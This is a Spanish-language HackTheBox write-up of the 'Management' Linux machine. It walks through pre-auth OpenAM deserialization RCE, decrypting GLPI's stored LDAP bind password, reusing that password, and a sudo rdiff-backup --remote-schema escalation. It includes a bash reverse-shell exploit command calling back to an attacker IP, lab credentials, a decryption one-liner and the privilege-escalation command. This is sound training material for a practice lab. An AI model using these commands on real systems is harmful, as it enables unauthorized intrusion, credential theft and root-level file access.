---
title: "Management"
date: 2026-09-15
categories: [HackTheBox, Easy]
tags: [linux, nginx, openam, forgerock, sso, ldap, jato, java-deserialization, cwe-502, cve-2026-33439, cve-2021-35464, pre-auth-rce, glpi, mariadb, reversible-encryption, libsodium, credential reuse, rdiff-backup, sudo-wildcard]
image:
  path: /assets/img/HTB/Management/banner.webp
  lqip: "data:image/webp;base64,UklGRogCAABXRUJQVlA4WAoAAAAQAAAAHwAAHwAAQUxQSNkAAAABgBzJtqvmvH93kIALAOR3RPTzgQAo1hTZyEsxeLN75h7Zp3eIICIYuG2kKFnmw0fgl8GAab+9fXd/v932U8ACanbA2fqBFR/WZ0BXwTBcJrJk/8FzIdNyCKvEw3MyOSt6Is8PYX/i4pGR/xr5uPgVOsyemNhg4tMMHYINrn5iW7gaWDCsfmJrWMHCYc7eiud8GLD5yduzDUYv9HacL6OehYKF/c6zQvbdPV3Bef9B0Q9XcR29og/RF9Kfi/5c9fdCfq/28F7q77X8Xcjflfxdyt/1fv4L8n8FAFZQOCCIAQAAsAcAnQEqIAAgAAOAWiWwAnTKEfibougRgNuhz5Nkj2YHKKsBldsAKoXQAeYAVojYB+avbrDWb7qpqiacBUL9l+OBXVRK0AD+Fe4GY5gyBRHMepMPW1+5hyyC8/D+e6tfWuBOpxyQDBGgZGySVsUXszwDp23EnU59vggeu3Tbq/26OViErV35oBwJ8uJ7/IJ2hW9LaakpEwSbzlo8kPrO1MUDrtbBuMHhFWI4HAbkDtUDnWBVQU1aOgON7vYX4+JRBv1KY5spbLmEmCLASsLrrVeDwD6UYKLEfxCw92oUGHgZWd99Gv7BTa7quYRIAvDo/jYayam/m4i5t1Vo4Dxnln5ANLr45cbVz8D92d1sMbVJd80/1WuqfWqybqbRGrDaEttc02z7pEkqHxHrz1grCR9a6lOd9LHHaXvEmhb0yrZnRJDxH5zFWH/8WTsmm0a/6/u8sIOM5svNJSxLW0rXdfawWx0921NjX28+MrrORIvZtmk8myH3EhzH2ZyuEATBe/erynFwAAA="
  alt: Management writeup
protected: true
---

Management es una máquina Linux Easy construida alrededor de un despliegue de single sign-on con OpenAM. Una clase de bug de hace cinco años reaparece como CVE-2026-33439 — deserialización Java sin autenticación en un parámetro de JATO que los mantenedores de OpenAM olvidaron parchear junto a su hermano — para el foothold. A partir de ahí, una instancia de GLPI instalada localmente filtra una contraseña de bind LDAP cifrada de forma reversible que resulta estar reutilizada como contraseña local de un usuario, y una regla sudo NOPASSWD con wildcard sobre `rdiff-backup` se abusa a través de su propio mecanismo de conexión remota para leer `root.txt` directamente del disco.

| Campo      | Detalles                |
|------------|----------------------------|
| Plataforma | HackTheBox                  |
| Dificultad | Easy                          |
| SO         | Linux                         |
| IP         | 10.129.62.89                  |
| Fecha      | Septiembre 2026                |

## Herramientas Usadas

| Herramienta                | Descripción                                                                            |
|-------------------------------|--------------------------------------------------------------------------------------------|
| nmap                           | Escáner de puertos de red y fingerprinting de servicios                                    |
| CVE-2026-33439 PoC             | Script de exploit público que envía el payload de deserialización al endpoint de reseteo de contraseña de OpenAM |
| netcat                         | Listener TCP usado para capturar la reverse shell                                          |
| Cliente MariaDB (mysql)        | Cliente SQL usado para consultar la base de datos local de GLPI                            |
| php (CLI)                      | Usado en línea para replicar el descifrado basado en libsodium de GLPI sobre la contraseña de bind LDAP almacenada |
| rdiff-backup                   | Herramienta de backup abusada tanto como binario permitido por sudo como a través de su propio mecanismo de conexión remota |

## Reconocimiento y Enumeración

El objetivo de esta fase fue enumerar los servicios expuestos e identificar el stack de la aplicación que merecía la pena atacar.

### Descubrimiento del Host

```bash
ping -c 1 10.129.62.89
PING 10.129.62.89 (10.129.62.89) 56(84) bytes of data.
64 bytes from 10.129.62.89: icmp_seq=1 ttl=63 time=43.4 ms

--- 10.129.62.89 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 43.404/43.404/43.404/0.000 ms
```

Un TTL de 63 indica un host Linux (por defecto 64, decrementado una vez al atravesar el salto de enrutamiento).

### Escaneo de Puertos

```bash
sudo nmap -p- -sCV -sS -n -Pn 10.129.62.89 -oN nmap
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp    open  http        nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://10.129.62.89/
443/tcp   open  ssl/http    nginx 1.24.0 (Ubuntu)
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
|_ssl-date: TLS randomness does not represent time
|_http-title: Did not follow redirect to https://management.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
| ssl-cert: Subject: commonName=management.htb/organizationName=Management Managed Services Ltd
| Subject Alternative Name: DNS:management.htb, DNS:*.management.htb
| Not valid before: 2026-06-02T01:21:44
|_Not valid after:  2126-05-09T01:21:44
1689/tcp  open  java-rmi    Java RMI
| rmi-dumpregistry: 
|   org.opends.server.protocols.jmx.client-unknown
|     javax.management.remote.rmi.RMIServerImpl_Stub
|     @127.0.1.1:37331
|     extends
|       java.rmi.server.RemoteStub
|       extends
|_        java.rmi.server.RemoteObject
4444/tcp  open  ssl/krb524?
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   LDAPSearchReq: 
|     0<0:
|     objectClass1+
|     ds-root-dse
|_    ds-cfg-root-dse-backend0
| ssl-cert: Subject: commonName=sso.management.htb/organizationName=Administration Connector RSA Self-Signed Certificate
| Not valid before: 2026-06-02T01:23:59
|_Not valid after:  2046-05-28T01:23:59
36909/tcp open  java-rmi Java RMI
50389/tcp open  ldap     (Anonymous bind OK)
```

Seis puertos abiertos, y entre ellos ya dibujan todo el stack. El puerto 80 redirige directamente a HTTPS. El certificado del puerto 443 nombra `management.htb` con un SAN wildcard (`*.management.htb`) — un wildcard no solo permite cualquier subdominio en tiempo de ejecución, le dice a un atacante que el operador esperaba que existiera más de un vhost, antes de que se haya encontrado ninguno por su nombre. `management.htb` se añadió a `/etc/hosts`.

La salida de `rmi-dumpregistry` del puerto 1689 nombra `org.opends.server.protocols.jmx.client-unknown` — OpenDS/OpenDJ es el motor de directorio LDAP que hay debajo del stack de identidad de OpenAM, expuesto aquí para administración remota vía JMX; `36909` es el puerto de stub dinámico que RMI entregó para hablar con ese objeto registrado. `50389` es el propio puerto LDAP del directorio, y el `(Anonymous bind OK)` de nmap merece señalarse aunque no se persiguiera más aquí. El certificado autofirmado del puerto 4444 es la línea más útil de todo el escaneo: su `commonName` es `sso.management.htb` — un segundo hostname, revelado en el propio handshake TLS, que no se había visto en ningún otro sitio todavía. Sus fingerprint strings (`objectClass`, `ds-root-dse`) confirman que es otra interfaz de administración relacionada con LDAP, esta vez sobre TLS.

### Enumeración Web — management.htb y sso.management.htb

`http://management.htb` carga un sitio de marketing para "Management Managed Services Ltd", un proveedor ficticio de servicios de TI gestionados, con un botón **Client login** en la cabecera. Pasando el ratón por encima — en lugar de hacer clic — se ve el destino real en la barra de estado del navegador sin necesidad de cargar la página:

![Hovering the Client login button on management.htb, showing the linked destination in the browser status bar](/assets/img/HTB/Management/cap1.png)

`https://sso.management.htb` — el mismo hostname que nmap ya había filtrado en el certificado del puerto 4444. También se añadió a `/etc/hosts`.

Cargar `https://sso.management.htb/openam/XUI/#login/` lleva a una pantalla de login de OpenAM. Su código fuente trae un bloque de arranque de RequireJS con un parámetro `urlArgs` para romper la caché:

```
<script type="text/javascript">
var require = {
urlArgs : "v=16.0.5",
deps : ['main']
};
</script>
```

`v=16.0.5` está ahí para romper la caché del navegador en cada release, no para anunciar la build exacta — pero hace ambas cosas. Las propias notas de la versión 16.0.6 de OpenAM nombran el arreglo de un bug crítico, sin autenticación, en la versión justo por debajo: **CVE-2026-33439**, con una PoC pública en [`github.com/infernosalex/CVE-2026-33439-Python-PoC`](https://github.com/infernosalex/CVE-2026-33439-Python-PoC).

## Explotación

### CVE-2026-33439 — Deserialización de `jato.clientSession` en OpenAM (RCE Pre-Autenticación)

Las páginas de administración y autoservicio de OpenAM están construidas sobre JATO, un framework web Java de la era Sun que guarda el estado de la interfaz por petición como objetos Java serializados, transportados entre peticiones en dos parámetros HTTP: `jato.pageSession` y `jato.clientSession`. En 2021, CVE-2021-35464 mostró que `jato.pageSession` se deserializaba sin ningún filtrado de clases — una gadget chain manipulada en ese parámetro significaba RCE pre-autenticación, lo bastante grave como para acabar en la lista de Known Exploited Vulnerabilities de CISA. El arreglo envolvió esa única ruta de código en un `WhitelistObjectInputStream`, que solo permite instanciar unas cuarenta clases conocidas como seguras antes de deserializar nada.

Nadie tocó el parámetro hermano. `jato.clientSession` se deserializa mediante una ruta de código completamente distinta — `ClientSession.deserializeAttributes()` llamando a `Encoder.deserialize()`, que entrega los bytes directamente a un `ObjectInputStream.readObject()` normal, sin ninguna whitelist. Cinco años después del primer arreglo, la misma clase de bug seguía ahí al lado, solo que bajo otro nombre de parámetro. Cualquier petición sin autenticar a una página JATO cuyo JSP renderice una etiqueta `<jato:form>` — el flujo de reseteo de contraseña es el objetivo de manual — deserializa lo que llegue en `jato.clientSession`, sin necesidad de login.

Un `ls` sencillo confirmó ejecución de comandos antes de comprometerse con una shell:

```bash
python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation 'ls'
[+] HTTP 200 
bin
bin.usr-is-merged
boot
[...]
```

```bash
python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation "bash -c 'bash -i >& /dev/tcp/10.10.14.174/4444 0>&1'"
[-] The read operation timed out
```

El propio cliente HTTP de la PoC hace timeout aquí — un payload de reverse shell bloquea en lugar de devolver una respuesta limpia — pero el comando ya se dispara en el servidor antes de que eso ocurra:

```bash
nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.62.89 37764
bash: cannot set terminal process group (1698): Inappropriate ioctl for device
bash: no job control in this shell
openam@management:/$ whoami
whoami
openam
```

El listener recibió el callback como `openam` — la cuenta de servicio bajo la que corre el propio OpenAM, con un nombre que dice exactamente lo que es. Un upgrade estándar de TTY dejó la shell utilizable.

## Movimiento Lateral — `openam` → `owen`

### Reconocimiento Interno

```bash
netstat -nltp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::50389                :::*                    LISTEN      1698/java           
tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN      1698/java           
tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN      1698/java           
tcp6       0      0 :::1689                 :::*                    LISTEN      1698/java           
tcp6       0      0 :::37331                :::*                    LISTEN      1698/java           
tcp6       0      0 :::22                   :::*                    LISTEN      -  
```

Todo lo que cuelga del PID `1698` (`java`) coincide con lo que nmap ya había encontrado — OpenAM corre bajo un Tomcat embebido, confirmado aquí por su conector HTTP interno en `8080` y su puerto de shutdown en `8005`, ambos solo en loopback, junto a los puertos de LDAP (`50389`) y RMI (`1689`/`37331`). La línea nueva es `127.0.0.1:3306` — una instancia local de MariaDB, invisible por completo desde el escaneo de red.

### GLPI — Encontrando la Credencial de Bind LDAP

```bash
find / -name "*conf*" 2>/dev/null | grep "/opt"
[...]
/opt/glpi/config/config_db.php
[...]
```

**GLPI** (Gestionnaire Libre de Parc Informatique) es una plataforma open-source de gestión de activos de TI y service desk — un encaje natural para una empresa llamada Management. Su fichero de configuración de base de datos estaba a la vista:

```bash
cat /opt/glpi/config/config_db.php
<?php
class DB extends DBmysql {
   public $dbhost = '127.0.0.1';
   public $dbuser = 'glpi';
   public $dbpassword = '8rhu0L6Pw4Y7';
   public $dbdefault = 'glpidb';
   public $use_utf8mb4 = true;
   public $allow_datetime = false;
   public $allow_signed_keys = false;
}
```

Directo a la instancia local de MariaDB con esas credenciales. `glpi_users` merecía un primer vistazo, pero sus hashes de contraseña no crackearon contra nada y ninguna de sus cuentas llevaba a ningún sitio — un callejón sin salida rápido. `glpi_authldaps` fue más interesante: GLPI puede sincronizar sus cuentas contra un directorio externo, y la tabla guarda exactamente la configuración de bind usada para ello.

```bash
MariaDB [glpidb]> select * from glpi_authldaps\G;
*************************** 1. row ***************************
                       id: 1
                     name: Management Directory
                     host: sso.management.htb
                   basedn: dc=management,dc=htb
                   rootdn: cn=svc-glpi,ou=services,dc=management,dc=htb
[...]
                  comment: Primary directory bind used to synchronise managed client accounts.
[...]
            rootdn_passwd: avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==
[...]
```

`rootdn` es una cuenta de servicio, `svc-glpi`, que GLPI usa para hacer bind al directorio y sincronizar usuarios gestionados — exactamente el tipo de cuenta privilegiada, y a menudo reutilizada, que merece la pena perseguir. `rootdn_passwd` no es un hash: una credencial de bind tiene que enviarse al directorio en una forma que el directorio pueda verificar, así que GLPI no puede permitirse un hasheo de un solo sentido aquí como sí hace con los logins normales de usuario. Tiene que ser reversible — cifrada con una clave que el propio GLPI guarda, no hasheada.

### Descifrando la Contraseña de Bind

```bash
cat /opt/glpi/src/GLPIKey.php
[...]
$nonce = mb_substr($string, 0, SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES, '8bit');
[...]
```

GLPI cifra las contraseñas de bind LDAP con el cifrado autenticado XChaCha20-Poly1305 de libsodium, usando una clave guardada en disco en `/opt/glpi/config/glpicrypt.key`. El valor almacenado es solo base64: decodificándolo, los primeros `SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES` bytes son el nonce, con el ciphertext justo después. Cualquiera que pueda leer tanto el valor cifrado en la base de datos como el fichero de la clave en disco — algo que `openam` ya podía hacer, permisos de fichero de GLPI aparte — puede descifrarlo sin más que PHP y la misma llamada a `sodium_crypto_aead_xchacha20poly1305_ietf_decrypt()` que usa GLPI internamente:

```bash
php -r '
$keyfile = "/opt/glpi/config/glpicrypt.key";
$key = file_get_contents($keyfile);

$encoded = "avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==";
$raw = base64_decode($encoded);

$nonce_len = SODIUM_CRYPTO_AEAD_XCHACHA20POLY1305_IETF_NPUBBYTES;
$nonce = mb_substr($raw, 0, $nonce_len, "8bit");
$ciphertext = mb_substr($raw, $nonce_len, null, "8bit");

$plaintext = sodium_crypto_aead_xchacha20poly1305_ietf_decrypt($ciphertext, $nonce, $nonce, $key);

echo $plaintext . PHP_EOL;
'
WpczC40GhTbk
```

Ese texto en claro es la contraseña de bind LDAP de `svc-glpi` — y resultó ser también la contraseña local de Linux de `owen`, un caso directo del mismo credential reutilizado entre la capa de directorio y la capa de sistema operativo:

```bash
su owen
Password: 
```

Eso da acceso interactivo completo como un usuario local real — un foothold más sólido que la cuenta de servicio `openam` para la búsqueda de escalada de privilegios que vino después.

## Escalada de Privilegios — `owen` → `root`

### Enumeración

```bash
sudo -l
Matching Defaults entries for owen on management:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin, use_pty

User owen may run the following commands on management:
    (root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *
```

Una invocación concreta, no un permiso general — pero el `*` final importa. Los wildcards de sudoers casan con cualquier cosa después del prefijo fijo, así que `owen` puede ejecutar este comando exacto con cualquier argumento adicional añadido después de `read-only`. Una comprobación rápida confirma que la regla acepta extras:

```bash
sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --version *
rdiff-backup 2.2.6
```

### Abusando de `--remote-schema`

`rdiff-backup` hace backup tanto de una ruta local como de una remota — una ubicación remota se escribe como `host::ruta`, y para esas, `rdiff-backup` no habla directamente con el sistema de ficheros remoto: lanza un subproceso (normalmente `ssh`) para correr una segunda copia de sí mismo en modo `--server` al otro lado, y le canaliza comandos por el stdin/stdout de ese subproceso. `--remote-schema` sobrescribe exactamente cuál es ese comando de subproceso, y `rdiff-backup` solo insiste en una cosa: la plantilla tiene que contener un `%s`, el placeholder donde sustituye el hostname.

Eso basta para volver la regla de sudo contra sí misma. Apuntar `--remote-schema` a la misma invocación de sudo que `owen` ya tiene permitida, y `rdiff-backup` la usará como comando de conexión — pero con flags `--restrict-path` y `--restrict-mode` frescos añadidos al final, que sobrescriben los ya incrustados en la regla de sudoers (un flag repetido se queda con el último valor que se le da), levantando la restricción de `/opt/backup` a `/`. El `%s` todavía tiene que aparecer en algún sitio para satisfacer la propia comprobación de `rdiff-backup`, así que va al final del todo, después de un carácter de comentario de shell (`#`) que evita que llegue nunca al comando real como argumento de verdad.

```bash
rdiff-backup \
  --remote-schema 'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path / --restrict-mode read-only #%s' \
  --include /root/root.txt --exclude '**' \
  x::/ /tmp/leak
WARNING: this command line interface is deprecated and will disappear, start using the new one as described with '--new --help'.
WARNING: this command line interface is deprecated and will disappear, start using the new one as described with '--new --help'.
WARNING: Server will be called with deprecated command line interface to guarantee compatibility. It might lead to a deprecation warning from newer rdiff-backup versions. Use '--api-version 201' (or higher) to avoid it.
NOTE: Starting mirror from source path / to destination path /tmp/leak
```

`x::/` es un origen con pinta de remoto pero desechable — el hostname `x` nunca se llega a usar de verdad, ya que `--remote-schema` sustituye por completo el paso de conexión. `--include /root/root.txt --exclude '**'` reduce el mirror a exactamente un fichero. El proceso `--server` al otro lado de esa tubería corre como root, sin restricción; el lado cliente, todavía como `owen`, simplemente recibe lo que le devuelve:

```bash
ls
leak
root.txt

cd leak/root
ls -la
-rw-r----- 1 owen owen   33 Sep 17 08:16 root.txt
cat root.txt
```

Nunca se llegó a abrir una shell interactiva de root — esto es lectura arbitraria de ficheros con permisos de root, conseguida secuestrando la propia idea que tiene `rdiff-backup` de cómo alcanzar un peer "remoto". Eso es todo lo que necesita `root.txt`.

## Flags

| Flag     | Valor      |
|----------|------------|
| root.txt | `REDACTED` |

## Conclusiones Clave

- **Un parche que cubre solo una de dos rutas de código casi idénticas es medio arreglo.** CVE-2026-33439 existió porque `jato.pageSession` y `jato.clientSession` deserializan el mismo tipo de datos mediante dos implementaciones separadas, y solo una de ellas recibió la whitelist de 2021. Cuando un arreglo apunta a un parámetro, función o endpoint concreto, merece la pena preguntarse si un hermano con la misma forma se quedó fuera.
- **Los certificados TLS revelan hostnames aunque no se esté buscando eso.** El `commonName` de una interfaz de administración interna nombró un subdominio — `sso.management.htb` — antes de que se hubiera encontrado de ninguna otra forma; un SAN wildcard en un certificado de cara al público hace lo mismo con familias enteras de subdominios de golpe.
- **Una contraseña de bind tiene que ser reversible, así que hay que tratarla como una credencial viva, no como un hash.** Cualquier aplicación que se autentique hacia fuera contra un directorio o una base de datos necesita el texto en claro en algún momento, lo que significa que la clave de descifrado está en el mismo disco que el ciphertext. Leer ambos basta.
- **Las cuentas de servicio se reutilizan como contraseñas humanas más a menudo de lo que la política permite.** Que la contraseña de bind LDAP de `svc-glpi` desbloquee el propio login local de `owen` es el mismo fallo que cualquier otro caso de reutilización de contraseñas — solo una capa más allá de donde la mayoría piensa en comprobar.
- **Un wildcard de sudoers (`*`) es una promesa que tiene que cumplir el programa objetivo, no sudo.** `sudo` aplica el prefijo fijo; todo lo que va después del `*` es problema del propio programa, y si ese programa tiene una funcionalidad — un comando de conexión personalizado, una ruta de plugin, un override de configuración — que a su vez ejecuta comandos o resuelve rutas, el wildcard se lo acaba de entregar.
- **Conseguir `root.txt` no requiere convertirse en root.** Un primitivo de lectura arbitraria de ficheros respaldado por los permisos de root vale exactamente lo mismo que una shell de root para cualquier cosa que solo necesite leer un fichero — no hay motivo para perseguir una shell interactiva si la lectura sola termina el trabajo.
